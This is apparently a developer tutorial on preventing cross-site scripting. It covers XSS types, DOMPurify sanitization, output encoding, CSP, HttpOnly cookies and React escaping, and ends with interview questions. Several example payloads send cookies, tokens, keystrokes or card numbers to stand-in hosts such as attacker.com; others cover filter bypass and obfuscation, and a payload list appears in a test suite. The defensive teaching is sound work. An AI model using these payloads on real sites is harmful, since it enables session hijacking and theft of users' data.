# 🛡️ XSS Attacks: Prevention & Mitigation

> Cross-Site Scripting (XSS) is the #1 web security vulnerability. Understanding XSS is critical for building secure frontend applications and protecting users from malicious attacks.

---

## 📖 1. Concept Explanation

### What is XSS?

**Cross-Site Scripting (XSS)** allows attackers to inject malicious JavaScript into web pages viewed by other users. This can steal cookies, session tokens, or perform actions on behalf of users.

```javascript
// ❌ VULNERABLE: User input rendered directly
function displayComment(comment) {
  document.getElementById("comments").innerHTML = comment;
}

// Attacker input:
// <script>fetch('https://evil.com?cookie=' + document.cookie)</script>

// Result: Attacker steals all users' cookies!
```

### Types of XSS

**1. Stored XSS (Persistent):**

- Malicious script stored in database
- Executed every time data is displayed
- **Most dangerous**

```javascript
// Attacker posts comment:
POST /api/comments
{
  "text": "<script>alert('XSS')</script>"
}

// Every user viewing comments executes the script!
```

**2. Reflected XSS (Non-Persistent):**

- Malicious script in URL/form data
- Reflected back in response
- Requires victim to click malicious link

```javascript
// Malicious URL:
//example.com/search?q=<script>alert('XSS')</script>

// Server reflects input:
https: <div>
  Results for: <script>alert('XSS')</script>
</div>;
```

**3. DOM-Based XSS:**

- Vulnerability in client-side JavaScript
- Never sent to server
- Exploits unsafe DOM manipulation

```javascript
// ❌ VULNERABLE
const search = new URLSearchParams(window.location.search).get("q");
document.getElementById("result").innerHTML = search;

// Malicious URL:
// ?q=<img src=x onerror=alert('XSS')>
```

---

## 🧠 2. Why It Matters in Real Projects

### Real-World Impact

**1. Session Hijacking:**

```javascript
// Attacker steals session token
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
</script>
```

**2. Keylogging:**

```javascript
// Attacker logs all keystrokes
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key)
  })
</script>
```

**3. Phishing:**

```javascript
// Attacker creates fake login form
<script>
  document.body.innerHTML = `
    <form action="https://attacker.com/steal">
      <input name="password" type="password" placeholder="Re-enter password">
      <button>Submit</button>
    </form>
  `
</script>
```

### Production Scenarios

**E-commerce Site:**

```javascript
// Attacker injects code in product review
POST /api/reviews
{
  "text": "Great product! <script>
    // Steal credit card data from checkout form
    document.querySelector('[name=cardNumber]').addEventListener('input', (e) => {
      fetch('https://attacker.com?card=' + e.target.value)
    })
  </script>"
}
```

**Social Media:**

```javascript
// Worm that spreads automatically
<script>
  // Post same XSS payload to all friends
  friends.forEach(friend => {
    postToWall(friend.id, '<script>/* same payload */</script>')
  })
</script>
```

---

## ⚙️ 3. Attack Vectors

### Common XSS Payloads

**1. Basic Alert:**

```html
<script>
  alert("XSS");
</script>
```

**2. Bypass Filters:**

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

**3. Data Exfiltration:**

```javascript
<script>
  fetch('https://attacker.com', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      localStorage: { ...localStorage },
      token: localStorage.getItem('authToken')
    })
  })
</script>
```

**4. Advanced Obfuscation:**

```html
<!-- Base64 encoding -->
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>

<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(&#39;XSS&#39;)>

<!-- Unicode escape -->
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>
```

---

## ✅ 4. Prevention Techniques

### 1. Input Sanitization

```javascript
// ❌ WRONG: No sanitization
function displayUserInput(input) {
  document.getElementById("output").innerHTML = input;
}

// ✅ CORRECT: DOMPurify
import DOMPurify from "dompurify";

function displayUserInput(input) {
  const clean = DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
    ALLOWED_ATTR: ["href"],
  });
  document.getElementById("output").innerHTML = clean;
}
```

### 2. Output Encoding

```javascript
// ❌ WRONG: Direct innerHTML
element.innerHTML = userInput;

// ✅ CORRECT: textContent (auto-escapes)
element.textContent = userInput;

// ✅ CORRECT: Manual escaping
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

element.innerHTML = escapeHtml(userInput);
```

### 3. Content Security Policy (CSP)

```html
<!-- Strict CSP header -->
<meta
  http-equiv="Content-Security-Policy"
  content="
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
"
/>
```

**Benefits:**

- Blocks inline scripts (no `<script>` tags)
- Blocks eval(), new Function()
- Whitelists allowed sources
- Prevents clickjacking

### 4. HttpOnly Cookies

```javascript
// Server-side: Set HttpOnly flag
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// JavaScript can't access HttpOnly cookies
console.log(document.cookie); // Won't include sessionId
```

### 5. React's Built-in Protection

```jsx
// ✅ SAFE: React auto-escapes
function Comment({ text }) {
  return <div>{text}</div>;
  // <script>alert('XSS')</script>
  // Renders as: &lt;script&gt;alert('XSS')&lt;/script&gt;
}

// ❌ DANGEROUS: dangerouslySetInnerHTML
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // XSS vulnerability!
}

// ✅ SAFE: Sanitize first
import DOMPurify from "dompurify";

function Comment({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

## ❌ 5. Common Mistakes

### Mistake #1: Trusting User Input

```javascript
// ❌ VULNERABLE
function renderMarkdown(markdown) {
  const html = marked(markdown); // Markdown to HTML
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// Attacker input:
// # Hello\n<script>alert('XSS')</script>

// ✅ SECURE
function renderMarkdown(markdown) {
  const html = marked(markdown);
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### Mistake #2: Client-Side Validation Only

```javascript
// ❌ INSUFFICIENT
function submitComment(text) {
  // Client-side sanitization only
  const clean = text.replace(/<script>/g, "");

  fetch("/api/comments", {
    method: "POST",
    body: JSON.stringify({ text: clean }),
  });
}

// Attacker bypasses by modifying HTTP request directly!

// ✅ SECURE: Server-side validation
// Server-side (Node.js):
app.post("/api/comments", (req, res) => {
  const clean = DOMPurify.sanitize(req.body.text);
  db.saveComment(clean);
});
```

### Mistake #3: Incomplete Sanitization

```javascript
// ❌ VULNERABLE: Blacklist approach
function sanitize(input) {
  return input.replace(/<script>/gi, "").replace(/javascript:/gi, "");
}

// Bypasses:
// <scr<script>ipt>alert('XSS')</script>
// <img src=x onerror=alert('XSS')>
// <svg onload=alert('XSS')>

// ✅ SECURE: Whitelist with DOMPurify
const clean = DOMPurify.sanitize(input, {
  ALLOWED_TAGS: ["p", "br", "strong", "em"],
  ALLOWED_ATTR: [],
});
```

### Mistake #4: innerHTML with User Data

```javascript
// ❌ VULNERABLE
function displayResults(results) {
  document.getElementById("results").innerHTML = results
    .map((r) => `<div class="result">${r.title}</div>`)
    .join("");
}

// ✅ SECURE: createElement
function displayResults(results) {
  const container = document.getElementById("results");
  container.innerHTML = ""; // Clear

  results.forEach((r) => {
    const div = document.createElement("div");
    div.className = "result";
    div.textContent = r.title; // Auto-escapes
    container.appendChild(div);
  });
}

// ✅ SECURE: React
function Results({ results }) {
  return (
    <div>
      {results.map((r) => (
        <div key={r.id} className="result">
          {r.title}
        </div>
      ))}
    </div>
  );
}
```

---

## 🔐 6. Defense in Depth

### Layer 1: Input Validation

```typescript
// Validate on server
import { z } from "zod";

const CommentSchema = z.object({
  text: z
    .string()
    .min(1)
    .max(1000)
    .regex(/^[a-zA-Z0-9\s.,!?-]+$/), // Alphanumeric + basic punctuation
  author: z.string().email(),
});

app.post("/api/comments", (req, res) => {
  try {
    const validated = CommentSchema.parse(req.body);
    // Process validated data
  } catch (error) {
    res.status(400).json({ error: "Invalid input" });
  }
});
```

### Layer 2: Output Encoding

```javascript
// Context-aware encoding
function encodeForHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

function encodeForAttribute(str) {
  return str.replace(/"/g, "&quot;").replace(/'/g, "&#x27;");
}

function encodeForJavaScript(str) {
  return str
    .replace(/\\/g, "\\\\")
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r");
}

// Usage
const html = `<div>${encodeForHTML(userInput)}</div>`;
const attr = `<div data-value="${encodeForAttribute(userInput)}"></div>`;
const js = `<script>const data = '${encodeForJavaScript(userInput)}';</script>`;
```

### Layer 3: Content Security Policy

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; " +
      "script-src 'self' 'nonce-" +
      req.nonce +
      "'; " +
      "style-src 'self' 'nonce-" +
      req.nonce +
      "'; " +
      "img-src 'self' https:; " +
      "font-src 'self'; " +
      "connect-src 'self' https://api.example.com; " +
      "frame-ancestors 'none'; " +
      "base-uri 'self'; " +
      "form-action 'self';",
  );
  next();
});
```

### Layer 4: HTTPOnly & Secure Cookies

```javascript
// Set secure cookies
app.post("/login", (req, res) => {
  const token = generateToken(user);

  res.cookie("session", token, {
    httpOnly: true, // Can't access via JavaScript
    secure: true, // HTTPS only
    sameSite: "strict", // CSRF protection
    maxAge: 3600000, // 1 hour
  });
});
```

---

## 🧪 7. Code Examples

### Example 1: Safe Rich Text Editor

```typescript
import DOMPurify from 'dompurify';
import { marked } from 'marked';

interface RichTextEditorProps {
  value: string;
  onChange: (value: string) => void;
}

function RichTextEditor({ value, onChange }: RichTextEditorProps) {
  const [preview, setPreview] = useState('');

  useEffect(() => {
    // Convert markdown to HTML
    const html = marked(value);

    // Sanitize with strict config
    const clean = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: [
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
        'ul', 'ol', 'li', 'a', 'code', 'pre'
      ],
      ALLOWED_ATTR: ['href', 'title'],
      ALLOW_DATA_ATTR: false
    });

    setPreview(clean);
  }, [value]);

  return (
    <div className="editor">
      <textarea
        value={value}
        onChange={e => onChange(e.target.value)}
        placeholder="Write markdown..."
      />

      <div
        className="preview"
        dangerouslySetInnerHTML={{ __html: preview }}
      />
    </div>
  );
}
```

### Example 2: Safe URL Rendering

```typescript
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  // Whitelist allowed protocols
  const isSafe = /^(https?:\/\/|mailto:|tel:)/i.test(href);

  if (!isSafe) {
    console.warn('Blocked unsafe URL:', href);
    return <span>{children}</span>;
  }

  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer" // Prevent window.opener access
    >
      {children}
    </a>
  );
}

// Usage
<SafeLink href={userProvidedUrl}>Click here</SafeLink>
```

### Example 3: XSS Testing Suite

```typescript
// xss-test.ts
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  "<iframe src=\"javascript:alert('XSS')\">",
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  '\'; alert("XSS"); //',
  '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
];

describe("XSS Protection", () => {
  test.each(XSS_PAYLOADS)("should sanitize payload: %s", (payload) => {
    const sanitized = DOMPurify.sanitize(payload);

    // Should not contain executable code
    expect(sanitized).not.toContain("<script");
    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("onload");
    expect(sanitized).not.toContain("javascript:");
  });
});
```

---

## 🏗️ 9. Real-World Use Cases

### Use Case 1: Comment System

```typescript
// Server-side validation & sanitization
import DOMPurify from "isomorphic-dompurify";

app.post("/api/comments", async (req, res) => {
  const { text, postId } = req.body;

  // 1. Validate input
  if (!text || text.length > 5000) {
    return res.status(400).json({ error: "Invalid comment" });
  }

  // 2. Sanitize
  const clean = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ["p", "br", "strong", "em", "a"],
    ALLOWED_ATTR: ["href"],
  });

  // 3. Additional validation
  if (clean !== text) {
    console.warn("XSS attempt detected:", { original: text, cleaned: clean });
  }

  // 4. Save to database
  const comment = await db.comments.create({
    text: clean,
    postId,
    userId: req.user.id,
  });

  res.json(comment);
});
```

### Use Case 2: User Profile Page

```tsx
interface UserProfile {
  name: string;
  bio: string;
  website: string;
  avatar: string;
}

function ProfilePage({ user }: { user: UserProfile }) {
  // Sanitize bio (may contain limited HTML)
  const safeBio = DOMPurify.sanitize(user.bio, {
    ALLOWED_TAGS: ["p", "br", "a"],
    ALLOWED_ATTR: ["href"],
  });

  // Validate website URL
  const isSafeUrl = /^https?:\/\//i.test(user.website);

  return (
    <div className="profile">
      <img
        src={user.avatar}
        alt={user.name}
        onError={(e) => {
          // Fallback to default avatar
          e.currentTarget.src = "/default-avatar.png";
        }}
      />

      <h1>{user.name}</h1>

      <div className="bio" dangerouslySetInnerHTML={{ __html: safeBio }} />

      {isSafeUrl && (
        <a href={user.website} target="_blank" rel="noopener noreferrer">
          Visit Website
        </a>
      )}
    </div>
  );
}
```

---

## ❓ 10. Interview Questions

### Q1: What is XSS and what are its types?

**Answer:**

**XSS (Cross-Site Scripting)** injects malicious scripts into web pages viewed by other users.

**Three types:**

1. **Stored XSS:**
   - Script stored in database
   - Executes for every user
   - **Most dangerous**
   - Example: Malicious comment

2. **Reflected XSS:**
   - Script in URL/form
   - Reflected in response
   - Requires victim to click link
   - Example: Search query XSS

3. **DOM-Based XSS:**
   - Client-side vulnerability
   - Never sent to server
   - Example: `innerHTML = location.hash`

**Prevention:**

- Sanitize input (DOMPurify)
- Encode output (textContent)
- CSP headers
- HTTPOnly cookies

---

### Q2: How does React prevent XSS by default?

**Answer:**

React auto-escapes values in JSX:

```jsx
// ✅ SAFE: React escapes
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>;

// Renders as: &lt;script&gt;alert("XSS")&lt;/script&gt;
```

**But dangerouslySetInnerHTML bypasses protection:**

```jsx
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ SAFE: Sanitize first
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userInput)
}} />
```

**React's protection:**

- JSX expressions auto-escaped
- String values in attributes escaped
- Prevents most common XSS

**Still vulnerable:**

- `dangerouslySetInnerHTML`
- `href="javascript:..."`
- Server-side rendering with unsanitized data

---

### Q3: What is Content Security Policy (CSP)?

**Answer:**

**CSP** is an HTTP header that restricts resource loading to prevent XSS.

**Example:**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
```

**Benefits:**

- Blocks inline scripts
- Blocks `eval()`, `new Function()`
- Whitelists allowed sources
- Prevents data exfiltration

**Implementation:**

```html
<!-- HTML meta tag -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-abc123'"
/>

<!-- HTTP header (preferred) -->
Content-Security-Policy: default-src 'self'

<!-- Report-only mode (testing) -->
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

**Nonce-based scripts:**

```html
<script nonce="abc123">
  // Allowed
</script>

<script>
  // Blocked! No nonce
</script>
```

---

### Q4: How do you sanitize user input safely?

**Answer:**

**Use DOMPurify with whitelist:**

```javascript
import DOMPurify from "dompurify";

// ✅ Safe sanitization
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "a"],
  ALLOWED_ATTR: ["href"],
  ALLOW_DATA_ATTR: false,
});

// ❌ Don't write your own sanitizer
function badSanitize(input) {
  return input.replace(/<script>/g, ""); // Easily bypassed!
}
```

**Context-specific encoding:**

```javascript
// HTML context
element.textContent = userInput; // Auto-escapes

// Attribute context
element.setAttribute("data-value", userInput); // Auto-escapes

// JavaScript context
const data = JSON.stringify(userInput); // Escapes
```

**Server-side validation:**

```javascript
app.post("/api/data", (req, res) => {
  // 1. Validate format
  if (!isValid(req.body.text)) {
    return res.status(400).json({ error: "Invalid input" });
  }

  // 2. Sanitize
  const clean = DOMPurify.sanitize(req.body.text);

  // 3. Store
  db.save(clean);
});
```

---

## 🎯 Summary

XSS is the #1 web vulnerability:

- **Types:** Stored, Reflected, DOM-based
- **Impact:** Session hijacking, keylogging, phishing
- **Prevention:** Sanitize input, encode output, CSP, HttpOnly cookies

**Production checklist:**

- ✅ Use DOMPurify for HTML sanitization
- ✅ Never use innerHTML with user data
- ✅ Implement strict CSP
- ✅ Set HttpOnly & Secure flags on cookies
- ✅ Validate server-side (never trust client)
- ✅ React: Avoid dangerouslySetInnerHTML
- ✅ Test with XSS payloads

**Defense in depth:** Multiple layers of protection, assume breach at any layer! 🛡️
